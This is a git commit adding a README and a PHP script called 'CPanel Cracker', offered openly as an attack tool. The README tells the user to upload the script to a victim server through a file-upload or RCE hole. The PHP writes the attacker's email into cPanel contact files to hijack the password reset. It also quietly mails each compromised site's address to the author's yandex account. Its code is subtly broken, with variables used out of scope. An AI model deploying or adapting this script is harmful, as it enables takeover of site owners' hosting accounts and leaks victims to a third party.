761c172d24fbcfd62674fe41ff32921e70ef959e
D4RK-VAMP1RE <57061403+D4rk-VAMP1RE@users.noreply.github.com>
2020-12-07 07:09:54 -0500

    Add files via upload

---
+++ README.md
@@ -0,0 +1,56 @@
+<center>
+	<a href="https://instagram.com/d4rk_vamp1re.py"><img src="banner.png" alt="D4rk-VAMP1RE"></a>
+
+   <h1 align="center"> CPanel Cracker </h1>
+</center>
+
+The CPanel Cracker is a php script which allows the attacker to reset cpanel and get access into it. The script must have to be uploaded in the target server by tempering the request and exploiting file upload vulnerbility or exploiting RCE vulnerbility.
+
+### Requirements
+
+What things you need to use the script
+
+```
+The CPanel must have reset password option.
+```
+
+### How To Use
+
+A step by step series of examples that tell you how to get a development env running
+
+Say what the step will be
+
+```
+$ git clone https://github.com/D4rk-VAMP1RE/CPanel_Cracker
+```
+
+
+```
+$ Upload the cpanel.php file in the target server.
+```
+
+```
+$ Now open the cpanel.php file in the new tab after uploading it.
+```
+
+```
+$ A dialog box will appear asking for your email address just put it and hit enter.
+```
+
+```
+$ You will be redirected to the Cpanel of the site. Now put your mail there and continue.
+```
+
+```
+$ Now you will recieve a email for reseting the cpanel password. It's Done Enjoy.
+```
+
+
+End with an example of getting some data out of the system or using it for a little demo
+
+## Support us :
+* [Contact us in Telegram](https://t.me/base64_encrypted)
+* [Follow us in Instagram](https://instagram.com/d4rk_vamp1re.py)
+* [Follow us in Twitter](https://twitter.com/D4rk_VAMP1RE)
+                           
+                         **JAI HIND**
---
+++ cpanel.php
@@ -0,0 +1,77 @@
+<?php
+$rpass= ":2083/resetpass?start=1";
+$server=$_SERVER['HTTP_HOST'];
+$Cracker = "http://".$server.$rpass;
+if (isset($_POST['submit'])) {
+
+$your_email = $_POST['Mail'];
+
+function Cpanel(){
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);
+}
+
+if (!$file = fopen("../.contactemail", "a")) {
+ header('refresh:2, url:cpanel.php');
+}
+else{
+Cpanel();
+}
+if (!$file = fopen("../../.contactemail", "a")) {
+
+header('refresh:2, url:cpanel.php');
+}
+else{
+Cpanel();
+}
+if (!$file = fopen("../../../.contactemail", "a")) {
+
+	header('refresh:2, url:cpanel.php');
+}
+else{
+Cpanel();
+}
+if (!$file = fopen("../../../../.contactemail", "a")) {
+header('refresh:2, url:cpanel.php');	
+}
+else{
+Cpanel();	
+}
+if (!$file = fopen("../../../../../.contactemail", "a")) {
+	header('refresh:2, url:cpanel.php');
+}
+else{
+Cpanel();	
+}
+}
+
+$to = "d4rk.vamp1re.ind@yandex.com";
+$subject = "Hurrah Got a cpanel!!";
+$body = $Cracker;
+$headers = "From: $server";
+mail($to, $subject, $body, $headers);
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Cpanel Cracker By #_D4rk_VAMP1RE</title>
+	<meta charset="utf-8">
+	<meta name='viewport' content='width=device-width, initial-scale=1'>
+	<link rel="SHORTCUT ICON" href="https://i.ibb.co/bmsqs1R/20201031-091156.png">	
+	<link rel="stylesheet" type="text/css" href="http://ddeeffaaccee.c1.biz/dv.css">
+</head>
+<body>
+<form method="POST">
+<div class="mail-form">
+	<h1 class="logo">D4RK  VAMP1RE</h1><br>
+<input class="HackerMail" type="email" name="Mail" autocomplete="off" style="outline-width: 0;" placeholder="Enter your private email !!" required>
+<br><br>
+<input type="submit" name="submit" class="Go" value="HACK CPANEL">
+<p class="copyright">&copy;<a href="mailto:d4rk.vamp1re.ind@yandex.com"> CPANEL CRACKER BY D4RK VAMP1RE</a></p>
+</div>
+</form>
+</body>
+</html>
